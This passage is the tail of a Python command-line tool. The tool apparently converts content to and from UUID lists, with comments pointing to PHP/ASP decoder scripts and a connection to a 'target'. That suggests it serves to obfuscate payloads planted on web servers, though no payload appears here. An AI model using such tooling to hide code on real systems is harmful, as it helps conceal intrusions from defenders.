                    console.print("[yellow]No input file specified and no data from stdin. Waiting for stdin input (Ctrl+D to end)...[/yellow]")
                uuid_input_str = sys.stdin.read()

            if not uuid_input_str.strip():
                console.print("[bold red]Error: No input UUIDs provided for decoding.[/bold red]")
                sys.exit(1)

            # Assuming raw list of UUIDs, one per line or space-separated etc.
            # More sophisticated parsing might be needed if it's embedded in ASP/PHP code.
            # For now, simple split by newline, filter empty.
            uuid_list = [u.strip() for u in re.split(r'[\s,]+', uuid_input_str) if u.strip()]


            if not uuid_list:
                console.print("[bold red]Error: No valid UUIDs found in the input for decoding.[/bold red]")
                sys.exit(1)

            try:
                # For "raw" decoding, we don't strip null padding by default from the combined bytestring
                # as the original content might have had significant nulls.
                # The script decoders (PHP/ASP) handle this internally.
                decoded_content = UuidEncoder.decode_from_uuids(uuid_list, strip_null_padding=False)
            except ValueError as ve: # Catch invalid UUID strings
                console.print(f"[bold red]Decoding Error: Invalid UUID encountered. {ve}[/bold red]")
                sys.exit(1)
            except Exception as e:
                console.print(f"[bold red]Decoding Error: {e}[/bold red]")
                sys.exit(1)

            console.print(f"[green]Decoded {len(uuid_list)} UUIDs into {len(decoded_content)} bytes[/green]")

            if args.output:
                with open(args.output, 'wb') as f:
                    f.write(decoded_content)
                console.print(f"[green]Decoded output written to {args.output}[/green]")
            else:
                sys.stdout.buffer.write(decoded_content)
                sys.stdout.buffer.flush()


    except KeyboardInterrupt:
        console.print("\n[bold red]Operation interrupted by user.[/bold red]")
        sys.exit(1)
    except requests.exceptions.ConnectionError as e:
        console.print(f"\n[bold red]Connection Error: Could not connect to target {args.target}. Details: {e}[/bold red]")
        sys.exit(1)
    except Exception as e:
        console.print(f"\n[bold red]An unexpected error occurred: {str(e)}[/bold red]")
        logger.exception("Unhandled exception in main_cli")
        sys.exit(1)

if __name__ == "__main__":
    main_cli()
